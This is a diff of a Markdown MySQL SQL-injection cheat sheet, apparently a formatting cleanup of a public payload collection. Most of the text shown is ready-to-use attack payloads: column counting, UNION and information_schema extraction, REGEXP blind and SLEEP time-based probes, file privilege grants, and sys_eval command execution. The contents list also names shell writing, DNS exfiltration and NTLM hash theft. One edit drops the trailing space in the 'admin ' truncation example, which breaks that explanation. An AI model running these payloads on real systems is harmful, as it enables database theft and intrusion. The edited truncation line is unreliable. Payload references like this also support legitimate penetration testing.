@@ -4,35 +4,34 @@
 
 * [MYSQL Comment](#mysql-comment)
 * [MYSQL Union Based](#mysql-union-based)
-    * [Detect columns number](#detect-columns-number)
-    * [Extract database with information_schema](#extract-database-with-information_schema)
-    * [Extract columns name without information_schema](#extract-columns-name-without-information_schema)
-    * [Extract data without columns name](#extract-data-without-columns-name)
+  * [Detect columns number](#detect-columns-number)
+  * [Extract database with information_schema](#extract-database-with-information_schema)
+  * [Extract columns name without information_schema](#extract-columns-name-without-information_schema)
+  * [Extract data without columns name](#extract-data-without-columns-name)
 * [MYSQL Error Based](#mysql-error-based)
-    * [MYSQL Error Based - Basic](#mysql-error-based---basic)
-    * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
-    * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
+  * [MYSQL Error Based - Basic](#mysql-error-based---basic)
+  * [MYSQL Error Based - UpdateXML function](#mysql-error-based---updatexml-function)
+  * [MYSQL Error Based - Extractvalue function](#mysql-error-based---extractvalue-function)
 * [MYSQL Blind](#mysql-blind)
-    * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
-    * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
-    * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make_set)
-    * [MYSQL Blind with LIKE](#mysql-blind-with-like)
+  * [MYSQL Blind with substring equivalent](#mysql-blind-with-substring-equivalent)
+  * [MYSQL Blind using a conditional statement](#mysql-blind-using-a-conditional-statement)
+  * [MYSQL Blind with MAKE_SET](#mysql-blind-with-make_set)
+  * [MYSQL Blind with LIKE](#mysql-blind-with-like)
 * [MYSQL Time Based](#mysql-time-based)
-    * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
-    * [Using conditional statements](#using-conditional-statements)
+  * [Using SLEEP in a subselect](#using-sleep-in-a-subselect)
+  * [Using conditional statements](#using-conditional-statements)
 * [MYSQL DIOS - Dump in One Shot](#mysql-dios---dump-in-one-shot)
 * [MYSQL Current queries](#mysql-current-queries)
 * [MYSQL Read content of a file](#mysql-read-content-of-a-file)
 * [MYSQL Write a shell](#mysql-write-a-shell)
-    * [Into outfile method](#into-outfile-method)
-    * [Into dumpfile method](#into-dumpfile-method)
+  * [Into outfile method](#into-outfile-method)
+  * [Into dumpfile method](#into-dumpfile-method)
 * [MYSQL UDF command execution](#mysql-udf-command-execution)
 * [MYSQL Truncation](#mysql-truncation)
 * [MYSQL Out of band](#mysql-out-of-band)
-    * [DNS exfiltration](#dns-exfiltration)
-    * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
+  * [DNS exfiltration](#dns-exfiltration)
+  * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
 * [References](#references)
-
 
 ## MYSQL comment
 
@@ -42,7 +41,6 @@
 /*! MYSQL Special SQL */
 /*!32302 10*/ Comment for MYSQL version 3.23.02
 ```
-
 
 ## MYSQL Union Based
 
@@ -56,65 +54,81 @@ Keep incrementing the number until you get a False response.
 Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.
 
 ```sql
-1' ORDER BY 1--+	#True
-1' ORDER BY 2--+	#True
-1' ORDER BY 3--+	#True
-1' ORDER BY 4--+	#False - Query is only using 3 columns
-                        #-1' UNION SELECT 1,2,3--+	True
+1' ORDER BY 1--+ #True
+1' ORDER BY 2--+ #True
+1' ORDER BY 3--+ #True
+1' ORDER BY 4--+ #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+ True
 ```
-or 
+
+or
+
 ```sql
-1' GROUP BY 1--+	#True
-1' GROUP BY 2--+	#True
-1' GROUP BY 3--+	#True
-1' GROUP BY 4--+	#False - Query is only using 3 columns
-                        #-1' UNION SELECT 1,2,3--+	True
+1' GROUP BY 1--+ #True
+1' GROUP BY 2--+ #True
+1' GROUP BY 3--+ #True
+1' GROUP BY 4--+ #False - Query is only using 3 columns
+                        #-1' UNION SELECT 1,2,3--+ True
 ```
+
 ##### Using `order by` or `group by` Error Based
+
 Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.
+
 ```sql
 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
 
 # Unknown column '4' in 'order clause'
 # This error means query uses 3 column
-#-1' UNION SELECT 1,2,3--+	True
+#-1' UNION SELECT 1,2,3--+ True
 ```
+
 or
+
 ```sql
 1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+
 
 # Unknown column '4' in 'group statement'
 # This error means query uses 3 column
-#-1' UNION SELECT 1,2,3--+	True
+#-1' UNION SELECT 1,2,3--+ True
 ```
+
 ##### Using `UNION SELECT` Error Based
+
 This method works if error showing is enabled
+
 ```sql
 1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
 1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
 1' UNION SELECT @,@,@--+    #No error means query uses 3 column
-                            #-1' UNION SELECT 1,2,3--+	True
+                            #-1' UNION SELECT 1,2,3--+ True
 ```
+
 ##### Using `LIMIT INTO` Error Based
+
 This method works if error showing is enabled.
 
 It is useful for finding the number of columns when the injection point is after a LIMIT clause.
+
 ```sql
 1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
 1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
 1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column
-                              #-1' UNION SELECT 1,2,3--+	True
+                              #-1' UNION SELECT 1,2,3--+ True
 ```
+
 ##### Using `SELECT * FROM SOME_EXISTING_TABLE` Error Based
+
 This works if you know the table name you're after and error showing is enabled.
 
 It will return the amount of columns in the table, not the query.
 
 ```sql
-1' AND (SELECT * FROM Users) = 1--+ 	#Operand should contain 3 column(s)
+1' AND (SELECT * FROM Users) = 1--+  #Operand should contain 3 column(s)
                                         # This error means query uses 3 column
-                                        #-1' UNION SELECT 1,2,3--+	True
+                                        #-1' UNION SELECT 1,2,3--+ True
 ```
+
 ### Extract database with information_schema
 
 Then the following codes will extract the databases'name, tables'name, columns'name.
@@ -130,13 +144,15 @@ UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
 
 Method for `MySQL >= 4.1`.
 
-First extract the column number with 
+First extract the column number with
+
 ```sql
 ?id=(1)and(SELECT * from db.users)=(1)
 -- Operand should contain 4 column(s)
 ```
 
 Then extract the column name.
+
 ```sql
 ?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
 --Column 'id' cannot be null
@@ -155,7 +171,7 @@ Method for `MySQL 5`
 ...
 ```
 
-### Extract data without columns name 
+### Extract data without columns name
 
 Extracting data from the 4th column without knowing its name.
 
@@ -173,10 +189,6 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 |         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
 +-----------+-----------------------------------------------------------------+
 ```
-
-
-
-
 
 ## MYSQL Error Based
 
@@ -241,14 +253,16 @@ For the EXISTS() function to return a 1, the REGEXP query needs to match up, thi
 [...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP "^[BRUTEFORCE CHAR BY CHAR].*" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -
 ```
 
-### MySQL Blind SQL Injection binary query using REGEXP.
+### MySQL Blind SQL Injection binary query using REGEXP
 
 Payload:
+
 ```
 ' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -
 ```
 
 Would work in the query (where the "where" clause is the injection point):
+
 ```
 SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP "^a.*") THEN SLEEP(3) ELSE 1 END)); -- -';
 ```
@@ -306,7 +320,7 @@ OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
 
 ```powershell
 1 and (select sleep(10) from dual where database() like '%')#
-1 and (select sleep(10) from dual where database() like '___')# 
+1 and (select sleep(10) from dual where database() like '___')#
 1 and (select sleep(10) from dual where database() like '____')#
 1 and (select sleep(10) from dual where database() like '_____')#
 1 and (select sleep(10) from dual where database() like 'a____')#
@@ -413,7 +427,7 @@ GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
 
 ## MYSQL Truncation
 
-In MYSQL "`admin `" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
+In MYSQL "`admin`" and "`admin`" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
 
 ```sql
 `username` varchar(20) not null
@@ -442,7 +456,6 @@ mysql> SELECT sys_eval('id');
 | uid=118(mysql) gid=128(mysql) groups=128(mysql) |
 +--------------------------------------------------+
 ```
-
 
 ## MYSQL Out of band
 
